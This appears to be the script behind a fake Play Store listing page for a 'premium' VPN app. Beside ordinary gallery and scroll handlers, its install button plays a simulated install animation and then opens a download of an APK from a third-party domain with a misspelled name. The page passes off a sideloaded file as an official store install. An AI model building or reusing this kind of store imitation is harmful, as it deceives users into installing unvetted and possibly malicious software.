// Play Store Interactive Features
document.addEventListener('DOMContentLoaded', function() {
  // Read More/Less functionality
  const description = document.querySelector('.description');
  const readMoreBtn = document.querySelector('.read-more');
  
  if (readMoreBtn) {
    readMoreBtn.addEventListener('click', function() {
      description.classList.toggle('expanded');
      readMoreBtn.textContent = description.classList.contains('expanded') ? 'Read less' : 'Read more';
    });
  }

  // Screenshot gallery scroll
  const gallery = document.querySelector('.screenshot-gallery');
  if (gallery) {
    let isDown = false;
    let startX;
    let scrollLeft;

    gallery.addEventListener('mousedown', (e) => {
      isDown = true;
      startX = e.pageX - gallery.offsetLeft;
      scrollLeft = gallery.scrollLeft;
    });

    gallery.addEventListener('mouseleave', () => {
      isDown = false;
    });

    gallery.addEventListener('mouseup', () => {
      isDown = false;
    });

    gallery.addEventListener('mousemove', (e) => {
      if (!isDown) return;
      e.preventDefault();
      const x = e.pageX - gallery.offsetLeft;
      const walk = (x - startX) * 2;
      gallery.scrollLeft = scrollLeft - walk;
    });
  }

  // Install button animation
  const installBtn = document.querySelector('.install-button');
  if (installBtn) {
    installBtn.addEventListener('click', function(e) {
      e.preventDefault();
      
      // Create ripple effect
      const ripple = document.createElement('span');
      ripple.style.position = 'absolute';
      ripple.style.borderRadius = '50%';
      ripple.style.background = 'rgba(255,255,255,0.5)';
      ripple.style.width = ripple.style.height = '40px';
      ripple.style.left = (e.clientX - e.target.offsetLeft - 20) + 'px';
      ripple.style.top = (e.clientY - e.target.offsetTop - 20) + 'px';
      ripple.style.animation = 'ripple 0.6s ease-out';
      
      e.target.style.position = 'relative';
      e.target.style.overflow = 'hidden';
      e.target.appendChild(ripple);
      
      // Change button text
      e.target.textContent = 'Installing...';
      e.target.style.background = '#5f6368';
      
      // Simulate download progress
      setTimeout(() => {
        e.target.textContent = 'Open';
        e.target.style.background = '#1f8b4e';
        window.open(e.target.href || 'https://donload.serverpremium.web.id/Artun-VPN-Premium.apk', '_blank');
      }, 2000);
      
      setTimeout(() => ripple.remove(), 600);
    });
  }

  // Smooth scroll for internal links
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({ behavior: 'smooth' });
      }
    });
  });
});

// Add ripple animation
const style = document.createElement('style');
style.textContent = `
  @keyframes ripple {
    to {
      transform: scale(4);
      opacity: 0;
    }
  }
`;
document.head.appendChild(style);
